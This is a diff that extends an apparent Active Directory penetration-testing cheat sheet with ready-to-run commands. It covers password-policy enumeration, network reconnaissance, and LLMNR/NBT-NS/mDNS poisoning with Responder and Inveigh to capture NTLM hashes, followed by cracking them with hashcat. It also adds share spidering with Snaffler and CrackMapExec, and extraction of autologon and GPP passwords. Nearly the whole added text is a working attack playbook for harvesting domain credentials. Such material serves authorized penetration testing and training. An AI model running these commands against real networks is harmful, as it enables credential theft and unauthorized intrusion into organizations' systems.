@@ -160,6 +160,124 @@ net accounts /domain
 
 # enum4linux-ng
 enum4linux-ng -P -u user -p pass <dc_ip>
+
+# rpcclient (unauthenticated, if null session allowed)
+rpcclient -U "" -N <dc_ip> -c "getdompwinfo"
+
+# ldapsearch
+ldapsearch -h <dc_ip> -x -b "DC=domain,DC=local" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
 ```
 
 Rule: if LockoutBadCount = 5, spray maximum 3 passwords and wait LockoutDuration before next batch.
+
+---
+
+## Network reconnaissance (pre-domain)
+
+```bash
+# Passive network enumeration — identify AD traffic patterns
+sudo tcpdump -i <interface> -n port 88 or port 389 or port 445
+
+# Responder in analyze mode (no poisoning) — identify LLMNR/NBT-NS/mDNS requests
+sudo responder -I <interface> -A
+
+# Discover alive hosts
+fping -asgq <subnet>/24
+
+# Identify domain controllers via DNS SRV records
+nslookup -type=srv _ldap._tcp.dc._msdcs.<domain>
+dig SRV _kerberos._tcp.<domain> @<dns_server>
+```
+
+---
+
+## LLMNR/NBT-NS/mDNS poisoning
+
+Capture NTLM hashes by answering broadcast name resolution queries.
+
+```bash
+# Responder (Linux attack host) — full poisoning mode
+sudo responder -I <interface> -wv
+# Hashes saved to /usr/share/responder/logs/
+# Crack NTLMv2: hashcat -m 5600
+
+# Responder with relay — disable SMB/HTTP, let ntlmrelayx handle them
+# Edit /etc/responder/Responder.conf: SMB=Off, HTTP=Off
+sudo responder -I <interface> -wv
+```
+
+```powershell
+# Inveigh (Windows — when operating from domain-joined host)
+Import-Module .\Inveigh.ps1
+Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
+
+# C# version (InveighZero)
+.\Inveigh.exe -FileOutput Y -NBNS Y -mDNS Y
+
+# Retrieve captured hashes
+Get-Inveigh -NTLMv2Unique
+```
+
+See `offensive-tools/network/responder/`, `offensive-tools/windows/inveigh/`.
+
+---
+
+## Credential hunting in shares (Snaffler)
+
+```powershell
+# Snaffler — automated share spider + content analysis
+.\Snaffler.exe -s -d domain.local -o snaffler.log -v data
+
+# Target specific hosts
+.\Snaffler.exe -s -n host1,host2 -o results.log -v data
+
+# Parse output for immediate wins
+Select-String -Path snaffler.log -Pattern "(password|credential|secret)" -CaseSensitive:$false
+```
+
+```bash
+# CrackMapExec spider_plus module
+crackmapexec smb <target> -u user -p pass -M spider_plus --share 'Department Shares'
+
+# SMBMap — enumerate readable shares
+smbmap -u user -p pass -d domain.local -H <dc_ip>
+
+# SMBClient — navigate manually
+smbclient -U 'DOMAIN\user' "\\\\<host>\\ShareName"
+```
+
+See `offensive-tools/windows/snaffler/`.
+
+---
+
+## Credential fields and misconfigurations
+
+```powershell
+# Accounts with PASSWD_NOTREQD — may have empty or weak passwords
+Get-DomainUser -UACFilter PASSWD_NOTREQD | Select samaccountname, useraccountcontrol
+
+# Passwords in user description fields (common in legacy environments)
+Get-DomainUser * | Select samaccountname, description | Where {$_.Description -ne $null}
+
+# Autologon credentials in registry
+Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\' -Name "DefaultUserName"
+Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\' -Name "DefaultPassword"
+
+# GPP passwords (legacy — MS14-025, still found in old environments)
+crackmapexec smb <dc_ip> -u user -p pass -M gpp_autologin
+crackmapexec smb <dc_ip> -u user -p pass -M gpp_password
+```
+
+---
+
+## UAC enumeration
+
+```powershell
+# Check if UAC is enabled
+REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
+# 0x1 = enabled, 0x0 = disabled
+
+# Check consent prompt behavior
+REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
+# 0x0 = no prompt, 0x5 = prompt for consent (default)
+```
